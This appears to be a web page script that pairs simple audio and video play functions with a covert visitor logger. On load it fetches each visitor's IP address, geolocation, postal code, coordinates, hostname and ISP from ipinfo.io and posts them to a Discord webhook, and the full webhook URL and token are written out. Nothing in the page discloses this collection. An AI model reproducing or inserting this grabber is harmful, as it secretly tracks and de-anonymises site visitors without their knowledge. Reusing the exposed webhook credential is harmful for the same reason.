/*
 ▐ ▄ ▄▄▄ .▄ •▄ .▄▄ · ▪            ▄▄ • .▄▄▄  
•█▌▐█▀▄.▀·█▌▄▌▪▐█ ▀. ██ ▪        ▐█ ▀ ▪▐▀•▀█ 
▐█▐▐▌▐▀▀▪▄▐▀▀▄·▄▀▀▀█▄▐█· ▄█▀▄    ▄█ ▀█▄█▌·.█▌
██▐█▌▐█▄▄▌▐█.█▌▐█▄▪▐█▐█▌▐█▌.▐▌   ▐█▄▪▐█▐█▪▄█·
▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀▀ ▀▀▀ ▀█▄▀▪ ▀ ·▀▀▀▀ ·▀▀█. 
*/

function audioPlay() {
  var audio = document.getElementById("audio");
  audio.volume = 0.4;
  audio.play()
}

function videoPlay() {
  var video = document.getElementById("video");
  video.play()
}

$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Logs",
        
        "color": 5202920,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `> ${data.ip}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/983076526675329044/9M5Tif5knOj31_cHsmXjn8gV14s2_XpmTWwUsFd8VIFC1sYXJHvt8C9EE5tJ4gTBk7Tf', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
    console.log(res);
  }) 
})


/*
 ▐ ▄ ▄▄▄ .▄ •▄ .▄▄ · ▪            ▄▄ • .▄▄▄  
•█▌▐█▀▄.▀·█▌▄▌▪▐█ ▀. ██ ▪        ▐█ ▀ ▪▐▀•▀█ 
▐█▐▐▌▐▀▀▪▄▐▀▀▄·▄▀▀▀█▄▐█· ▄█▀▄    ▄█ ▀█▄█▌·.█▌
██▐█▌▐█▄▄▌▐█.█▌▐█▄▪▐█▐█▌▐█▌.▐▌   ▐█▄▪▐█▐█▪▄█·
▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀▀ ▀▀▀ ▀█▄▀▪ ▀ ·▀▀▀▀ ·▀▀█. 
*/
